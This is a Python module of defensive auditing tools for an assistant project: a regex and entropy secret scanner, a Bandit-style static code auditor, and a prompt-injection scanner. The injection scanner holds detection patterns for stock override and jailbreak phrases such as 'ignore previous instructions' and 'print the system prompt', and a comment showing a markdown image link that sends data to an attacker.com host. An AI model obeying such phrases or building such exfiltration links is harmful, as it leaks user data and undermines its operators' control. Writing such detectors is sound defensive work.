"""
Security and Integrity Auditing Tools for Operation JARVIS.
Integrates Yelp detect-secrets, PyCQA Bandit AST scanning, and multi-vector prompt injection detection.
"""
import ast
import base64
import math
import os
import re
from pathlib import Path
from typing import Any, Dict, List, Optional
from security.path_jail import path_jail, PathJailViolation

def _calculate_shannon_entropy(data: str) -> float:
    """Calculates Shannon entropy of a string."""
    if not data:
        return 0.0
    entropy = 0.0
    length = len(data)
    char_counts = {}
    for c in data:
        char_counts[c] = char_counts.get(c, 0) + 1
    for count in char_counts.values():
        p = count / length
        entropy -= p * math.log2(p)
    return entropy

def tool_security_scan_secrets(
    path: Optional[str] = None,
    content: Optional[str] = None
) -> Dict[str, Any]:
    """
    Scans a file or raw content for leaked secrets, API keys, private keys, and high-entropy credentials.
    Derived from Yelp detect-secrets heuristics and pattern matching.
    """
    text_to_scan = ""
    target_display = "inline content"

    if path:
        try:
            safe_path = path_jail.validate_path(path)
            if not safe_path.exists():
                return {"ok": False, "error": f"Target path '{path}' does not exist."}
            if safe_path.is_dir():
                # Scan all files in directory up to 50 files
                findings = []
                count = 0
                for f in safe_path.rglob("*"):
                    if f.is_file() and f.suffix.lower() in (".py", ".json", ".yaml", ".yml", ".env", ".txt", ".md", ".toml", ".js", ".ts"):
                        count += 1
                        if count > 50:
                            break
                        try:
                            f_text = f.read_text(encoding="utf-8", errors="ignore")
                            sub_res = tool_security_scan_secrets(content=f_text)
                            for item in sub_res.get("findings", []):
                                item["file"] = str(f.relative_to(safe_path))
                                findings.append(item)
                        except Exception:
                            pass
                return {
                    "ok": True,
                    "target": str(safe_path),
                    "files_scanned": count,
                    "secrets_detected": len(findings),
                    "status": "LEAK_DETECTED" if findings else "CLEAN",
                    "findings": findings
                }
            else:
                text_to_scan = safe_path.read_text(encoding="utf-8", errors="ignore")
                target_display = str(safe_path)
        except PathJailViolation as pe:
            return {"ok": False, "error": str(pe)}
        except Exception as e:
            return {"ok": False, "error": f"Failed to read path: {str(e)}"}
    elif content is not None:
        text_to_scan = content
    else:
        return {"ok": False, "error": "Either 'path' or 'content' must be provided."}

    # Secret patterns
    patterns = [
        ("AWS Access Key", r"(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}"),
        ("AWS Secret Key", r"(?i)aws_secret_access_key\s*[:=]\s*['\"]?([a-zA-Z0-9/+=]{40})['\"]?"),
        ("GitHub Personal Access Token", r"(?:ghp|gho|ghu|ghs|ghr)_[a-zA-Z0-9]{36,255}"),
        ("GitHub Fine-grained PAT", r"github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59}"),
        ("Slack Token", r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,32}"),
        ("RSA/Private Key", r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"),
        ("Generic High-Entropy API Key", r"(?i)(?:api_key|apikey|secret|token|password|auth_token)\s*[:=]\s*['\"]([a-zA-Z0-9_\-]{20,80})['\"]"),
        ("JWT Secret Token", r"eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}")
    ]

    findings = []
    lines = text_to_scan.splitlines()

    for idx, line in enumerate(lines, start=1):
        # Ignore comments or mock tokens
        if "YOUR_API_KEY" in line or "dummy" in line.lower() or "example" in line.lower():
            continue

        for label, pat in patterns:
            for match in re.finditer(pat, line):
                matched_val = match.group(1) if match.groups() else match.group(0)
                # Filter out obvious false positives
                if len(matched_val) < 8:
                    continue

                # Redact matched secret
                redacted = matched_val[:4] + "*" * (len(matched_val) - 6) + matched_val[-2:] if len(matched_val) > 8 else "***REDACTED***"
                findings.append({
                    "line_number": idx,
                    "secret_type": label,
                    "preview": redacted,
                    "line_snippet": line[:80].replace(matched_val, redacted)
                })

        # High entropy word scan
        words = re.findall(r"\b[a-zA-Z0-9+/=_-]{24,}\b", line)
        for w in words:
            # Skip common hashes if recognized as hex
            if re.fullmatch(r"[a-fA-F0-9]{32,64}", w):
                continue
            ent = _calculate_shannon_entropy(w)
            if ent > 4.5:
                # Flag high-entropy token
                redacted = w[:4] + "*" * (len(w) - 6) + w[-2:]
                findings.append({
                    "line_number": idx,
                    "secret_type": "High-Entropy Secret String",
                    "entropy": round(ent, 2),
                    "preview": redacted,
                    "line_snippet": line[:80].replace(w, redacted)
                })

    return {
        "ok": True,
        "target": target_display,
        "lines_scanned": len(lines),
        "secrets_detected": len(findings),
        "status": "LEAK_DETECTED" if findings else "CLEAN",
        "findings": findings
    }

def tool_security_audit_code(
    path: Optional[str] = None,
    code: Optional[str] = None
) -> Dict[str, Any]:
    """
    Performs Static Application Security Testing (SAST) on Python code using AST inspection.
    Derived from PyCQA Bandit ruleset (B102, B301, B303, B501, B506, B602, B608).
    """
    source_code = ""
    target_display = "inline code"

    if path:
        try:
            safe_path = path_jail.validate_path(path)
            if not safe_path.exists():
                return {"ok": False, "error": f"Target path '{path}' does not exist."}
            source_code = safe_path.read_text(encoding="utf-8", errors="ignore")
            target_display = str(safe_path)
        except PathJailViolation as pe:
            return {"ok": False, "error": str(pe)}
        except Exception as e:
            return {"ok": False, "error": f"Failed to read path: {str(e)}"}
    elif code is not None:
        source_code = code
    else:
        return {"ok": False, "error": "Either 'path' or 'code' must be provided."}

    try:
        tree = ast.parse(source_code)
    except SyntaxError as se:
        return {
            "ok": False,
            "error": f"SyntaxError in Python source: {se.msg} (line {se.lineno})"
        }

    issues = []

    class BanditVisitor(ast.NodeVisitor):
        def visit_Call(self, node):
            # B102: exec / eval
            func_name = ""
            if isinstance(node.func, ast.Name):
                func_name = node.func.id
            elif isinstance(node.func, ast.Attribute):
                func_name = node.func.attr

            if func_name in ("exec", "eval"):
                issues.append({
                    "test_id": "B102",
                    "severity": "HIGH",
                    "confidence": "HIGH",
                    "line": getattr(node, "lineno", 0),
                    "description": f"Use of potentially dangerous function '{func_name}'."
                })

            # B602: subprocess with shell=True
            if func_name in ("call", "check_call", "check_output", "Popen", "run"):
                for kw in node.keywords:
                    if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                        issues.append({
                            "test_id": "B602",
                            "severity": "HIGH",
                            "confidence": "HIGH",
                            "line": getattr(node, "lineno", 0),
                            "description": f"subprocess call with shell=True can lead to shell injection vulnerabilities."
                        })

            # B301: pickle / dill
            if isinstance(node.func, ast.Attribute):
                val = getattr(node.func.value, "id", "")
                if val in ("pickle", "cPickle", "dill") and node.func.attr in ("load", "loads"):
                    issues.append({
                        "test_id": "B301",
                        "severity": "MEDIUM",
                        "confidence": "HIGH",
                        "line": getattr(node, "lineno", 0),
                        "description": f"Deserialization with {val}.{node.func.attr}() is vulnerable to arbitrary code execution."
                    })

                # B303: weak cryptographic hashes
                if val == "hashlib" and node.func.attr in ("md5", "sha1"):
                    issues.append({
                        "test_id": "B303",
                        "severity": "LOW",
                        "confidence": "HIGH",
                        "line": getattr(node, "lineno", 0),
                        "description": f"Use of insecure MD5/SHA1 hash algorithm: hashlib.{node.func.attr}()."
                    })

                # B501: requests / httpx verify=False
                if val in ("requests", "httpx", "http"):
                    for kw in node.keywords:
                        if kw.arg == "verify" and isinstance(kw.value, ast.Constant) and kw.value.value is False:
                            issues.append({
                                "test_id": "B501",
                                "severity": "HIGH",
                                "confidence": "HIGH",
                                "line": getattr(node, "lineno", 0),
                                "description": "SSL certificate verification disabled (verify=False)."
                            })

            # B608: SQL injection via string formatting in execute()
            if func_name in ("execute", "executemany"):
                if node.args:
                    first_arg = node.args[0]
                    if isinstance(first_arg, ast.BinOp) and isinstance(first_arg.op, (ast.Mod, ast.Add)):
                        issues.append({
                            "test_id": "B608",
                            "severity": "MEDIUM",
                            "confidence": "MEDIUM",
                            "line": getattr(node, "lineno", 0),
                            "description": "Possible SQL injection detected: SQL statement constructed via string concatenation or format operator."
                        })
                    elif isinstance(first_arg, ast.JoinedStr):
                        issues.append({
                            "test_id": "B608",
                            "severity": "MEDIUM",
                            "confidence": "MEDIUM",
                            "line": getattr(node, "lineno", 0),
                            "description": "Possible SQL injection detected: SQL statement constructed via f-string expression."
                        })

            self.generic_visit(node)

        def visit_Assign(self, node):
            # B608: Check for SQL string concatenation in assignment
            for target in node.targets:
                if isinstance(target, ast.Name) and any(term in target.id.lower() for term in ("sql", "query", "stmt")):
                    if isinstance(node.value, ast.BinOp) and isinstance(node.value.op, (ast.Add, ast.Mod)):
                        issues.append({
                            "test_id": "B608",
                            "severity": "MEDIUM",
                            "confidence": "HIGH",
                            "line": getattr(node, "lineno", 0),
                            "description": f"SQL string '{target.id}' constructed via string concatenation or format operator."
                        })
                    elif isinstance(node.value, ast.JoinedStr):
                        issues.append({
                            "test_id": "B608",
                            "severity": "MEDIUM",
                            "confidence": "HIGH",
                            "line": getattr(node, "lineno", 0),
                            "description": f"SQL string '{target.id}' constructed via formatted f-string."
                        })
            self.generic_visit(node)

    visitor = BanditVisitor()
    visitor.visit(tree)

    high_count = sum(1 for i in issues if i["severity"] == "HIGH")
    med_count = sum(1 for i in issues if i["severity"] == "MEDIUM")
    low_count = sum(1 for i in issues if i["severity"] == "LOW")

    return {
        "ok": True,
        "target": target_display,
        "total_issues": len(issues),
        "high_severity": high_count,
        "medium_severity": med_count,
        "low_severity": low_count,
        "status": "VULNERABILITIES_FOUND" if issues else "CLEAN",
        "issues": issues
    }

def tool_security_injection_scan(
    content: str,
    canary_token: Optional[str] = None
) -> Dict[str, Any]:
    """
    Multi-vector prompt injection, data exfiltration, and canary token leak scanner.
    Analyzes content for indirect prompt injections, zero-width spaces, base64 payloads,
    markdown exfiltration URLs, and system override attempts.
    """
    if not content:
        return {
            "ok": True,
            "safe": True,
            "threat_level": "NONE",
            "flags": [],
            "canary_leaked": False
        }

    flags = []
    threat_score = 0

    # 1. Canary Token Leakage Check
    canary_leaked = False
    if canary_token and canary_token in content:
        canary_leaked = True
        flags.append({
            "vector": "CANARY_TOKEN_LEAK",
            "severity": "CRITICAL",
            "detail": f"Active canary token was exposed in output text."
        })
        threat_score += 50

    # 2. Zero-Width Characters / Unicode Obfuscation
    zero_width_chars = [c for c in content if c in ("\u200b", "\u200c", "\u200d", "\ufeff", "\u202a", "\u202b", "\u202e")]
    if len(zero_width_chars) > 2:
        flags.append({
            "vector": "ZERO_WIDTH_OBFUSCATION",
            "severity": "HIGH",
            "detail": f"Detected {len(zero_width_chars)} hidden zero-width/bidi control characters."
        })
        threat_score += 25

    # 3. Base64 Hidden Instruction Payloads
    b64_matches = re.findall(r"(?:[A-Za-z0-9+/]{4}){6,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?", content)
    for b64 in b64_matches:
        try:
            decoded = base64.b64decode(b64).decode("utf-8", errors="ignore").lower()
            if any(term in decoded for term in ("system", "ignore", "prompt", "password", "token", "override")):
                flags.append({
                    "vector": "ENCODED_PAYLOAD",
                    "severity": "HIGH",
                    "detail": f"Decoded base64 payload containing directive terms: '{decoded[:40]}...'"
                })
                threat_score += 30
                break
        except Exception:
            pass

    # 4. Markdown Data Exfiltration Links
    # Format: ![image](http://attacker.com/leak?data=...)
    md_img_links = re.findall(r"!\[.*?\]\((https?://[^\s\)]+)\)", content)
    for link in md_img_links:
        if any(p in link.lower() for p in ("leak", "steal", "token", "exfil", "q=", "secret")):
            flags.append({
                "vector": "MARKDOWN_EXFILTRATION",
                "severity": "CRITICAL",
                "detail": f"Suspicious markdown image exfiltration URL: {link[:60]}..."
            })
            threat_score += 40

    # 5. Direct System Override / Jailbreak Keywords
    override_patterns = [
        (r"ignore\s+(?:all\s+)?previous\s+instructions", "Instruction override directive"),
        (r"you\s+are\s+now\s+(?:DAN|unfiltered|jailbroken|an\s+unrestricted)", "Persona jailbreak pattern"),
        (r"disregard\s+all\s+(?:safety|prior)\s+rules", "Safety rule bypass attempt"),
        (r"print\s+(?:the\s+)?system\s+prompt", "System prompt extraction attempt"),
        (r"bypass\s+all\s+content\s+filters", "Filter bypass directive")
    ]
    for pat, desc in override_patterns:
        if re.search(pat, content, re.IGNORECASE):
            flags.append({
                "vector": "DIRECT_OVERRIDE",
                "severity": "HIGH",
                "detail": desc
            })
            threat_score += 30

    # Classify overall threat level
    if threat_score == 0:
        threat_level = "NONE"
    elif threat_score < 25:
        threat_level = "LOW"
    elif threat_score < 50:
        threat_level = "MEDIUM"
    else:
        threat_level = "CRITICAL"

    return {
        "ok": True,
        "safe": threat_score < 25,
        "threat_level": threat_level,
        "threat_score": threat_score,
        "canary_leaked": canary_leaked,
        "flags": flags
    }
